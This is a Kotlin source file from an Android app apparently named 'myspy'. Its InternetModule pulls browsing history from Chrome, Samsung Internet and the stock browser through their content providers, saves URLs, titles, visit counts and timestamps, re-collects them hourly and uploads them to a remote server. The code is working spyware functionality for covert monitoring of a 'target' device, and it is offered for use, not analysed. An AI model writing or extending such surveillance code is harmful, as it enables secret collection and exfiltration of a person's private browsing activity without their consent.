package com.myspy.android.modules.internet

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import com.myspy.android.data.local.db.entities.BrowserHistoryEntity
import com.myspy.android.data.repository.BrowserHistoryRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

/**
 * Internet/Browser History Monitoring Module
 * Monitors browser history from Chrome and other browsers
 *
 * Note: This requires the target browser's content provider to be accessible,
 * which may require additional permissions or may not work on all devices
 *
 * @author Michael KOJDL
 * @version 1.0.0
 */
class InternetModule(
    private val context: Context,
    private val repository: BrowserHistoryRepository,
    private val scope: CoroutineScope
) {
    companion object {
        private const val TAG = "InternetModule"

        // Chrome browser history URI
        private const val CHROME_HISTORY_URI = "content://com.android.chrome.browser/bookmarks"

        // Common browsers to check
        private val BROWSER_CONTENT_URIS = listOf(
            "content://com.android.chrome.browser/bookmarks",
            "content://com.sec.android.app.sbrowser.browser/bookmarks",
            "content://com.android.browser.provider/bookmarks"
        )
    }

    private var isRunning = false
    private var lastCollectionTime = 0L

    /**
     * No special permissions needed, but browser access may be restricted
     */
    fun hasPermissions(): Boolean = true

    /**
     * Start monitoring browser history
     */
    fun start() {
        if (isRunning) {
            Log.d(TAG, "InternetModule already running")
            return
        }

        Log.i(TAG, "Starting InternetModule")
        isRunning = true

        // Collect browser history immediately
        collectBrowserHistory()
    }

    /**
     * Stop monitoring browser history
     */
    fun stop() {
        if (!isRunning) return

        Log.i(TAG, "Stopping InternetModule")
        isRunning = false
    }

    /**
     * Sync collected data to server
     */
    suspend fun syncData(): Result<Int> {
        Log.d(TAG, "Syncing browser history to server")
        return repository.syncToServer()
    }

    /**
     * Get count of unsynced history entries
     */
    suspend fun getUnsyncedCount(): Int {
        return repository.getUnsyncedCount()
    }

    /**
     * Refresh browser history (call periodically)
     */
    fun refreshHistory() {
        if (!isRunning) return

        val currentTime = System.currentTimeMillis()
        // Don't refresh more than once per hour
        if (currentTime - lastCollectionTime < 3600000) {
            Log.d(TAG, "Browser history was recently refreshed, skipping")
            return
        }

        collectBrowserHistory()
    }

    /**
     * Collect browser history from available browsers
     */
    private fun collectBrowserHistory() {
        scope.launch(Dispatchers.IO) {
            try {
                Log.d(TAG, "Collecting browser history")
                val historyList = mutableListOf<BrowserHistoryEntity>()

                // Try each browser URI
                for (uriString in BROWSER_CONTENT_URIS) {
                    try {
                        val browserHistory = queryBrowserHistory(uriString)
                        historyList.addAll(browserHistory)
                    } catch (e: Exception) {
                        Log.w(TAG, "Cannot access browser at $uriString: ${e.message}")
                    }
                }

                if (historyList.isNotEmpty()) {
                    repository.saveMultiple(historyList)
                    lastCollectionTime = System.currentTimeMillis()
                    Log.i(TAG, "Collected ${historyList.size} browser history entries")
                } else {
                    Log.d(TAG, "No browser history found or access denied")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error collecting browser history", e)
            }
        }
    }

    /**
     * Query browser history from specific content URI
     */
    private fun queryBrowserHistory(uriString: String): List<BrowserHistoryEntity> {
        val historyList = mutableListOf<BrowserHistoryEntity>()

        try {
            val uri = Uri.parse(uriString)
            val projection = arrayOf(
                "url",
                "title",
                "visits",
                "date"
            )

            val cursor: Cursor? = context.contentResolver.query(
                uri,
                projection,
                "bookmark = 0", // Only history, not bookmarks
                null,
                "date DESC LIMIT 500"
            )

            cursor?.use {
                val urlIndex = it.getColumnIndex("url")
                val titleIndex = it.getColumnIndex("title")
                val visitsIndex = it.getColumnIndex("visits")
                val dateIndex = it.getColumnIndex("date")

                if (urlIndex == -1 || dateIndex == -1) {
                    Log.w(TAG, "Required columns not found in browser database")
                    return historyList
                }

                while (it.moveToNext()) {
                    try {
                        val url = it.getString(urlIndex)
                        val title = if (titleIndex != -1) it.getString(titleIndex) else null
                        val visitCount = if (visitsIndex != -1) it.getInt(visitsIndex) else 1
                        val timestamp = if (dateIndex != -1) it.getLong(dateIndex) else System.currentTimeMillis()

                        if (url.isNotEmpty()) {
                            historyList.add(
                                BrowserHistoryEntity(
                                    url = url,
                                    title = title,
                                    visitCount = visitCount,
                                    timestamp = timestamp,
                                    synced = false
                                )
                            )
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Error processing browser history row", e)
                    }
                }

                Log.d(TAG, "Retrieved ${historyList.size} entries from $uriString")
            }
        } catch (e: SecurityException) {
            Log.w(TAG, "Permission denied accessing browser: $uriString")
            throw e
        } catch (e: Exception) {
            Log.w(TAG, "Error querying browser history: $uriString", e)
            throw e
        }

        return historyList
    }

    /**
     * Try to collect Chrome history specifically
     * Note: On modern Android versions, this may be blocked by security restrictions
     */
    fun collectChromeHistory(): Int {
        return try {
            val history = queryBrowserHistory(CHROME_HISTORY_URI)
            if (history.isNotEmpty()) {
                scope.launch(Dispatchers.IO) {
                    repository.saveMultiple(history)
                }
            }
            history.size
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting Chrome history", e)
            0
        }
    }
}
